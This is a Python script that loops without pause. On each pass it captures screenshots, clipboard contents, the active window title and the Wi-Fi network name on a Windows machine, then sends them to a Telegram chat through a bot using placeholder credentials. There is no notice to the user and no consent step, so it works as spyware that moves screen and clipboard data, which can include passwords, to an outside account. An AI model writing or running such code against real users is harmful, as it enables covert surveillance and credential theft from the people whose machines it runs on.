import psutil
import telegram
import time
from datetime import datetime
import pygetwindow as gw
import subprocess
from PIL import ImageGrab
import pyautogui
import pyperclip

def get_current_application_title():
    """Get the title of the current foreground window"""
    try:
        return gw.getActiveWindow().title
    except:
        return 'Unknown'

def get_connected_wifi_name():
    """Get the name of the connected Wi-Fi network"""
    try:
        output = subprocess.check_output('netsh wlan show interfaces')
        output = output.decode('utf-8').split('\n')
        for line in output:
            if 'SSID' in line and 'BSSID' not in line:
                return line.split(':')[1].strip()
    except:
        pass
    return 'Unknown'

def take_screenshot():
    """Take a screenshot and save it to a file"""
    screenshot = pyautogui.screenshot()
    screenshot.save('screenshot.png')

def escape_markdown(text):
    """Escape special characters in Markdown text"""
    escape_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join('\\' + char if char in escape_chars else char for char in text)

TOKEN = 'enter_your_token_here'
bot = telegram.Bot(token=TOKEN)
chat_id = 'enter_your_chat_id_here'

# Initialize message and photo IDs
message_id = None
photo_id = None

while True:
    # Update information
    battery = psutil.sensors_battery()
    percent = battery.percent
    status = 'Charging' if battery.power_plugged else 'Not charging'
    now = datetime.now().strftime('%H:%M:%S')
    current_application = escape_markdown(get_current_application_title())
    wifi_name = escape_markdown(get_connected_wifi_name())
    clipboard_content = escape_markdown(pyperclip.paste())
    message_text = f'*{now}* : \nBattery percentage: {percent}\nStatus: {status}\nCurrent application: {current_application}\nConnected Wi-Fi: {wifi_name}\nClipboard content: {clipboard_content}'

    # Take screenshot and send or edit photo
    take_screenshot()
    try:
        if photo_id is None:
            photo_message = bot.send_photo(chat_id=chat_id, photo=open('screenshot.png', 'rb'))
            photo_id = photo_message.message_id
        else:
            bot.edit_message_media(chat_id=chat_id, message_id=photo_id, media=telegram.InputMediaPhoto(open('screenshot.png', 'rb')))
    except telegram.error.BadRequest as e:
       print(f'Error editing photo: {e.message}')

    # Send or edit message
    try:
        if message_id is None:
            text_message = bot.send_message(chat_id=chat_id, text=message_text, parse_mode='Markdown')
            message_id = text_message.message_id
        else:
            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=message_text, parse_mode='Markdown')
    except telegram.error.BadRequest as e:
        print(f'Error editing message: {e.message}')
